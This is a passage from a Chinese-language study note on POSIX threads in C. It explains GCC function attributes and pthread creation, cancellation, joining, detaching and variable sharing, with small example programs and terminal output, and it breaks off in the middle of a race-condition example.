<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/pthread]</span><br><span class="line">└─# gcc main.c -Wall -o main 		<span class="comment">#-Wall开启所有警告</span></span><br><span class="line">main.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">main.c:4:5: warning: argument 1 null <span class="built_in">where</span> non-null expected [-Wnonnull]</span><br><span class="line">    4 |     func(NULL);</span><br><span class="line">      |     ^~~~</span><br><span class="line">main.c:2:31: note: <span class="keyword">in</span> a call to <span class="keyword">function</span> ‘func’ declared ‘nonnull’</span><br><span class="line">    2 | void __attribute__((nonnull)) func(char *s)&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>编译警告func的参数应该非空</p>
</blockquote>
<blockquote>
<p>关于函数属性<code>__THROW</code>修饰符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define __THROW __attribute__ ((__nothrow__ __LEAF))</span><br></pre></td></tr></table></figure>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nothrow</span><br></pre></td></tr></table></figure>
<p>The <code>nothrow</code> attribute is used to inform the compiler
that a function cannot throw an exception. For example, most functions
in the standard C library can be guaranteed not to throw an exception
with the notable exceptions of <code>qsort</code> and
<code>bsearch</code> that take function pointer arguments. The
<code>nothrow</code> attribute is not implemented in GCC versions
earlier than 3.3.</p>
</blockquote>
<p>nothrow属性用来通知编译器,函数不会抛出异常</p>
<p>比如,C标准库中的大多数函数都保证不会抛出qsort和bsearch使用函数指针作为参数的错误;</p>
<p>在GCC3.3之前没有该属性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leaf</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Calls to external functions with this attribute must return to the
current compilation unit only by return or by exception handling. In
particular, leaf functions are not allowed to call callback function
passed to it from the current compilation unit or directly call
functions exported by the unit or longjmp into the unit. Leaf function
might still call functions from other compilation units and thus they
are not necessarily leaf in the sense that they contain no function
calls at all.</p>
<p>The attribute is intended for library functions to improve dataflow
analysis. The compiler takes the hint that any data not escaping the
current compilation unit can not be used or modified by the leaf
function. For example, the <code>sin</code> function is a leaf function,
but <code>qsort</code> is not.</p>
<p>Note that leaf functions might invoke signals and signal handlers
might be defined in the current compilation unit and use static
variables. The only compliant way to write such a signal handler is to
declare such variables <code>volatile</code>.</p>
<p>The attribute has no effect on functions defined within the current
compilation unit. This is to allow easy merging of multiple compilation
units into one, for example, by using the link time optimization. For
this reason the attribute is not allowed on types to annotate indirect
calls.</p>
</blockquote>
<p>总之表示声明为leaf的函数不会调用其他函数</p>
</blockquote>
<p>综上,<code>pthread_create</code>函数要求,第一个参数tid,第三个参数,例程函数指针非空.四个参数指针指向的内容在本线程执行过程中不能被其他线程引用.<code>pthread_create</code>函数不会抛出异常,<code>pthread_create</code>函数只会调用例程函数,不会调用其他函数(至于例程函数会不会调用其他函数我不管)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> tid=pthread_self();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;in func,tid=%ld\n&quot;</span>,tid);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;<span class="comment">//return NULL之后本线程结束</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> tid1=pthread_self();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;in main,tid1=%ld\n&quot;</span>,tid1);</span><br><span class="line">    <span class="type">pthread_t</span> tid2;</span><br><span class="line">    <span class="type">int</span> status=pthread_create(&amp;tid2,<span class="literal">NULL</span>,func,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;in main,tid2=%ld\n&quot;</span>,tid2);</span><br><span class="line">    pthread_join(tid2,<span class="literal">NULL</span>);<span class="comment">//主线程等待对等线程结束之后才结束</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/<span class="number">86135</span>/desktop/pthread]</span><br><span class="line">└─<span class="meta"># gcc main.c -o main -lpthread</span></span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/<span class="number">86135</span>/desktop/pthread]</span><br><span class="line">└─# ./main</span><br><span class="line">in main,tid1=<span class="number">140685510317888</span></span><br><span class="line">in main,tid2=<span class="number">140685510313536</span></span><br><span class="line">in func,tid=<span class="number">140685510313536</span></span><br></pre></td></tr></table></figure>
<p>func和main函数所在的线程id确实不同了</p>
<h4 id="终止线程pthread_exit">终止线程<code>pthread_exit</code></h4>
<p>线程的终止方式有两种: 一是顶层线程例程return,隐式终止</p>
<blockquote>
<p>"顶层线程例程"的意思是,</p>
<p>线程例程是一个函数,该函数可以调用其他函数,这些被调用的函数也属于本线程,但是最高层的那个函数(也就是pthread_create时指定的函数)返回时才算线程的结束</p>
</blockquote>
<p>二是显示使用<code>pthread_exit</code>函数结束</p>
<blockquote>
<p>如果main函数所在的主线程使用<code>pthread_exit</code>,则主线程会等待所有对等线程终止之后才会终止主线程和整个进程</p>
</blockquote>
<p>线程函数的返回值怎么让其他线程知道呢?</p>
<blockquote>
<p>比如main线程创建了一个对等线程去执行func函数,假设func函数有返回值,怎么让main知道这个返回值呢?</p>
</blockquote>
<p>使用<code>pthread_exit</code>函数解决</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Terminate calling thread.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The registered cleanup handlers are called via exception handling</span></span><br><span class="line"><span class="comment">   so we cannot mark this function with __THROW.*/</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">pthread_exit</span> <span class="params">(<span class="type">void</span> *__retval)</span> __<span class="title function_">attribute__</span> <span class="params">((__noreturn__))</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>终止线程</p>
<p>清理程序以异常处理进行,因此我们不能将该函数标记为<code>__THROW</code></p>
<blockquote>

</blockquote>
</blockquote>
<p>返回值通过指针参数<code>void *__retval</code>传递</p>
<h4
id="杀死对等线程pthread_cancel">杀死对等线程<code>pthread_cancel</code></h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Cancel THREAD immediately or at the next possibility.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">pthread_cancel</span> <span class="params">(<span class="type">pthread_t</span> __th)</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>CSAPP:马上终止线程"或者下一个可能的时候"?没使用过该函数</p>
</blockquote>
<p><code>main.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">func</span><span class="params">(<span class="type">void</span> *times)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;*((<span class="type">long</span>*)times);++i)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> tid;</span><br><span class="line">    <span class="type">long</span> times=<span class="number">1000</span>;</span><br><span class="line">    <span class="type">int</span> status=pthread_create(&amp;tid,<span class="literal">NULL</span>,func,&amp;times);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;++i)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    pthread_cancel(tid);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/desktop/pthread]</span><br><span class="line">└─$ gcc main.c -O0 -o main -lpthread</span><br><span class="line"></span><br><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/desktop/pthread]</span><br><span class="line">└─$ ./main</span><br><span class="line"></span><br><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/desktop/pthread]</span><br><span class="line">└─$ ./main</span><br><span class="line"></span><br><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/desktop/pthread]</span><br><span class="line">└─$ ./main</span><br><span class="line">0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167</span><br></pre></td></tr></table></figure>
<p>前两次运行没等对等线程开始执行,<code>main</code>线程就将其杀掉了</p>
<p>第三次对等线程执行到i=167左右时,<code>main</code>线程执行到<code>pthread_cancel(tid)</code>将对等线程杀掉了</p>
<h4 id="杀死全部对等进程exit">杀死全部对等进程<code>exit</code></h4>
<p>如果有一个对等线程调用<code>exit</code>函数,则立刻杀死所有对等线程并终止进程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">func</span><span class="params">(<span class="type">void</span> *times)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;in func,tid=%ld&quot;</span>,pthread_self());</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> tid;</span><br><span class="line">    <span class="type">long</span> times=<span class="number">100</span>;</span><br><span class="line">    <span class="type">int</span> status=pthread_create(&amp;tid,<span class="literal">NULL</span>,func,&amp;times);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread %ld created\n&quot;</span>,tid);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10000000</span>;++i)&#123;<span class="comment">//空转浪费时间</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main exit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/desktop/pthread]</span><br><span class="line">└─$ ./main</span><br><span class="line">thread 140558930863680 created</span><br><span class="line"><span class="keyword">in</span> func,tid=140558930863680</span><br></pre></td></tr></table></figure>
<p>由于对等线程提前执行<code>exit</code>,此时主线程还没有来得及打印<code>printf("main exit\n");</code>进程就结束了</p>
<h4
id="回收已终止线程资源pthread_join">回收已终止线程资源<code>pthread_join</code></h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Make calling thread wait for termination of the thread TH.  The</span></span><br><span class="line"><span class="comment">   exit status of the thread is stored in *THREAD_RETURN, if THREAD_RETURN</span></span><br><span class="line"><span class="comment">   is not NULL.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This function is a cancellation point and therefore not marked with</span></span><br><span class="line"><span class="comment">   __THROW.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">pthread_join</span> <span class="params">(<span class="type">pthread_t</span> __th, <span class="type">void</span> **__thread_return)</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>使调用线程等待TH线程的结束</p>
<p>如果指定了<code>__thread_return</code>参数并且不为空,则使用<code>_thread_return</code>参数承接<code>TH</code>线程的退出状态</p>
<p>该函数是一个取消点,因此不用<code>__THROW</code>标记</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">func</span><span class="params">(<span class="type">void</span> *times)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;*((<span class="type">long</span>*)times);++i)&#123;<span class="comment">//空转消耗时间</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;in func,tid=%ld\n&quot;</span>,pthread_self());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> tid;</span><br><span class="line">    <span class="type">long</span> times=<span class="number">100</span>;</span><br><span class="line">    <span class="type">int</span> status=pthread_create(&amp;tid,<span class="literal">NULL</span>,func,&amp;times);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread %ld created\n&quot;</span>,tid);</span><br><span class="line">    pthread_join(tid,<span class="literal">NULL</span>);<span class="comment">//此时主线程等待对等线程</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread %ld joined\n&quot;</span>,tid);</span><br><span class="line"></span><br><span class="line">    status=pthread_create(&amp;tid,<span class="literal">NULL</span>,func,&amp;times);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread %ld created\n&quot;</span>,tid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main exit&quot;</span>);<span class="comment">//主函数不再等待对等线程</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/desktop/pthread]</span><br><span class="line">└─$ ./main</span><br><span class="line">thread 140127873893952 created</span><br><span class="line"><span class="keyword">in</span> func,tid=140127873893952</span><br><span class="line">thread 140127873893952 joined</span><br><span class="line">thread 140127873893952 created</span><br><span class="line">main <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<p>在<code>pthread_join(tid,NULL)</code>处,主线程会等待tid线程结束然后继续执行</p>
<p>后来又创建了线程但是没有等待它结束,主线程率先结束,相当于调用了<code>exit</code>函数,直接结束了所有对等线程,因此后来的对等线程没有执行<code>func</code>中的<code>printf</code></p>
<h4 id="分离线程pthread_detach">分离线程<code>pthread_detach</code></h4>
<p>一个线程在创建之后,其相对于对等线程</p>
<p>1.可结合的(joinable)</p>
<p>2.分离的(detached)</p>
<blockquote>
<p>注意两种状态的叫法</p>
<p>一个是"可"结合的,而不是说"结合的",因为结合的意思是被对等进程使用<code>pthread_join</code>回收掉了</p>
<p>"分离的"意思是已经分离,原来的对等线程无法管理它</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Indicate that the thread TH is never to be joined with PTHREAD_JOIN.</span></span><br><span class="line"><span class="comment">   The resources of TH will therefore be freed immediately when it</span></span><br><span class="line"><span class="comment">   terminates, instead of waiting for another thread to perform PTHREAD_JOIN</span></span><br><span class="line"><span class="comment">   on it.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">pthread_detach</span> <span class="params">(<span class="type">pthread_t</span> __th)</span> __THROW;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>pthread_detach</code>函数表明,TH线程将永远不会"加入"调用线程</p>
<p>因此当TH线程结束时,其资源将会被立刻回收,而不必再等待被对等线程调用<code>pthread_join</code>回收</p>
</blockquote>
<h4 id="初始化线程pthread_once">初始化线程<code>pthread_once</code></h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Guarantee that the initialization function INIT_ROUTINE will be called</span></span><br><span class="line"><span class="comment">   only once, even if pthread_once is executed several times with the</span></span><br><span class="line"><span class="comment">   same ONCE_CONTROL argument. ONCE_CONTROL must point to a static or</span></span><br><span class="line"><span class="comment">   extern variable initialized to PTHREAD_ONCE_INIT.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The initialization functions might throw exception which is why</span></span><br><span class="line"><span class="comment">   this function is not marked with __THROW.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">pthread_once</span> <span class="params">(<span class="type">pthread_once_t</span> *__once_control,</span></span><br><span class="line"><span class="params">			 <span class="type">void</span> (*__init_routine) (<span class="type">void</span>))</span> __<span class="title function_">nonnull</span> <span class="params">((<span class="number">1</span>, <span class="number">2</span>))</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>初始化线程例程的相关状态</p>
<p>具体作用目前未知</p>
<h2 id="单处理器机器上多线程同步问题">单处理器机器上多线程同步问题</h2>
<h3 id="变量在内存中的位置">变量在内存中的位置</h3>
<table>
<thead>
<tr>
<th>变量类型</th>
<th style="text-align: left;">共享情况</th>
</tr>
</thead>
<tbody>
<tr>
<td>全局变量或者全局位置的静态变量</td>
<td style="text-align: left;">共享</td>
</tr>
<tr>
<td>线程函数内静态变量</td>
<td style="text-align: left;">共享</td>
</tr>
<tr>
<td>线程函数内的普通局部变量</td>
<td style="text-align: left;">不共享</td>
</tr>
</tbody>
</table>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> global=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">func</span><span class="params">(<span class="type">void</span> *)</span>&#123;</span><br><span class="line">    <span class="type">int</span> local_in_func=<span class="number">20</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_in_func=<span class="number">30</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;in func,tid=%ld,&amp;global=%p,&amp;local_in_func=%p,&amp;static_in_func=%p\n&quot;</span>,pthread_self(),&amp;global,&amp;local_in_func,&amp;static_in_func);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;++i)&#123;</span><br><span class="line">			<span class="comment">//空转耗时</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;tid=%ld exit\n&quot;</span>,pthread_self());</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> tid1,tid2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;in main,tid=%ld,&amp;global=%p\n&quot;</span>,pthread_self(),&amp;global);</span><br><span class="line">    pthread_create(&amp;tid1,<span class="literal">NULL</span>,func,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;tid2,<span class="literal">NULL</span>,func,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(tid1,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(tid2,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/desktop/pthread]</span><br><span class="line">└─$ gcc -O0 main.c -o main -lpthread</span><br><span class="line"></span><br><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/desktop/pthread]</span><br><span class="line">└─$ ./main</span><br><span class="line"><span class="keyword">in</span> main,tid=140195300874048,&amp;global=0x558b84485048</span><br><span class="line"><span class="keyword">in</span> func,tid=140195300869696,&amp;global=0x558b84485048,&amp;local_in_func=0x7f81c31b7e48,&amp;static_in_func=0x558b8448504c</span><br><span class="line"><span class="keyword">in</span> func,tid=140195292476992,&amp;global=0x558b84485048,&amp;local_in_func=0x7f81c29b6e48,&amp;static_in_func=0x558b8448504c</span><br><span class="line">tid=140195300869696 <span class="built_in">exit</span></span><br><span class="line">tid=140195292476992 <span class="built_in">exit</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结果表明<code>&amp;global</code>都是同一个地址,<code>&amp;static_in_func</code>都是同一个地址,<code>&amp;local_in_func</code>是每个线程各有一个地址</p>
<h3 id="同步错误">同步错误</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">long</span> cnt=<span class="number">0</span>;<span class="comment">//volatile修饰,避免将cnt放在寄存器中,编译器不要对本变量做优化</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">func</span><span class="params">(<span class="type">void</span> *vargp)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> niters=*((<span class="type">long</span>*)vargp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">long</span> i=<span class="number">0</span>;i&lt;niters;++i)&#123;</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    <span class="type">long</span> niters;</span><br><span class="line">    <span class="type">pthread_t</span> tid1,tid2;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;expect a number as argument\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    niters=atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    pthread_create(&amp;tid1,<span class="literal">NULL</span>,func,&amp;niters);</span><br><span class="line">    pthread_create(&amp;tid2,<span class="literal">NULL</span>,func,&amp;niters);</span><br><span class="line">    pthread_join(tid1,<span 